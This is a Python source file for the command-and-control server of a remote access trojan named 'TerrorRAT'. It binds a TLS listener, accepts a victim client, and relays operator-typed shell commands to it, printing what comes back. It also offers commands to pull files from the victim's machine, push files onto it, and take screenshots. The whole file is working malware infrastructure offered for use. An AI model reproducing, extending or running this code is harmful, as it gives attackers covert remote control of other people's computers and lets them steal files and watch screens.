import ssl
import socket
import os
import sys
from time import sleep
from datetime import datetime
from menu import display_menu
from menu import about
from download_upload import Download_and_Upload

class server:
    
    def __init__(self,server_ip,server_port):
        self.server_ip=server_ip
        self.server_port=server_port
        self.server_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.secure_server_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        
    def server_download(self,file_path):
        script_dir = os.path.dirname(os.path.abspath(__file__)) 
        download_dir = os.path.join(script_dir, "Downloads")
        file_name_with_ext = os.path.basename(file_path)
        file_name=os.path.join(download_dir, file_name_with_ext)
        if not os.path.exists(download_dir):
            os.makedirs(download_dir)
        counter = 1
        while os.path.exists(file_name):
            name, extention = os.path.splitext(file_name)
            file_name = f"{name}({counter}){extention}"
            counter += 1            

        download_obj=Download_and_Upload(self.secure_server_socket)
        download_obj.download(file_name)



    def server_upload(self,path_input):
        upload_obj=Download_and_Upload(self.secure_server_socket)
        upload_obj.upload(path_input)


    def handle_exit(self):
        
        print("Farewell my friend!\n")
        if self.server_socket and not self.server_socket._closed:
                self.secure_server_socket.close()
                self.server_socket.close()
                sys.exit(0)


    def server_c2_connector(self):
        
        display_menu()
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.server_ip,int(self.server_port)))
        self.server_socket.listen(1)

        context=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="server.crt",keyfile="server.key")

        while True:
            try:

                print("Listening for incoming connections...\n")
                raw_socket, client_address = self.server_socket.accept()
                self.secure_server_socket=context.wrap_socket(raw_socket,server_side=True)

                print("IP:{} Connected successfully!\n".format(client_address))
            except KeyboardInterrupt:
                self.handle_exit()
            while True:
                try:
                        
                        command = input("TerrorRAT >> ")
                        self.secure_server_socket.send(command.encode())
                        if not command:
                          continue
                        if command=="Exit":
                            self.handle_exit()
                        
                        elif command.startswith("cd"):
                            continue #Because cd doesn't return any output

                        elif command.startswith("download"):
                            file_path = command.strip("download ")
                            self.server_download(file_path)
                            continue

                        elif command.startswith("upload"):
                            path_input=command.strip("upload ")
                            self.server_upload(path_input)
                            continue
                        elif command=="screenshot":
                            print("Screenshot taken successfully and saved at './Screenshots' folder...\n")
                            continue
                        elif command=="about":
                            about()
                            continue
                        elif command=="help":
                            display_menu()
                            continue

                        total_response=""
                        while True:
                            response = self.secure_server_socket.recv(2048)
                            if response==b"": # this means that client has disconnected, so it returns an empty string
                                break
                            total_response+=response.decode()
                            if total_response.endswith("ENDOFMESSAGE"):
                                total_response=total_response.replace("ENDOFMESSAGE", "")
                                break
                        print(total_response+"\n")
                        sleep(0.2)
                        if response==b"": # this means that client has disconnected, so it come out of the second loop as well
                                break
                        
                except (ConnectionResetError, ConnectionAbortedError,ConnectionError,ConnectionRefusedError,ConnectionResetError):
                        print("Client connection lost abruptly.")
                        break
                except Exception as e:
                        print(f"{e}")
                        break
                except KeyboardInterrupt:
                    self.handle_exit()

            self.secure_server_socket.close()
            print("Ready for next connection...\n")
                
                


    
if __name__=="__main__":

    while True:
        try:
            # Input IP address
            input_ip = input("Enter the IP address to bind to (e.g., 127.0.0.1 or 0.0.0.0 for all interfaces):\n").strip()
            if not input_ip:
                print("IP address cannot be empty.")
                continue # Ask again
            # Validate IP format
            socket.inet_aton(input_ip)
            break # Exit loop if valid
        except socket.error:
            print("Invalid IP address format. Please enter a valid IPv4 address.")
        except KeyboardInterrupt:
            sys.exit(0)


    while True:
        try:
            input_port_str = input("Enter the port number (e.g., 7900):\n").strip()
            if not input_port_str:
                print("Port number cannot be empty.")
                continue  
            input_port = int(input_port_str)
            if 0 < input_port <= 65535:
                break
            else:
                print("Port number must be between 1 and 65535.")
        except ValueError:
            print("Invalid port number. Please enter a number.")
        except KeyboardInterrupt:
            sys.exit(0)
            


    print("\nTerrorRAT C2 Server starting...")
    c2server = server(input_ip, input_port)
    c2server.server_c2_connector()
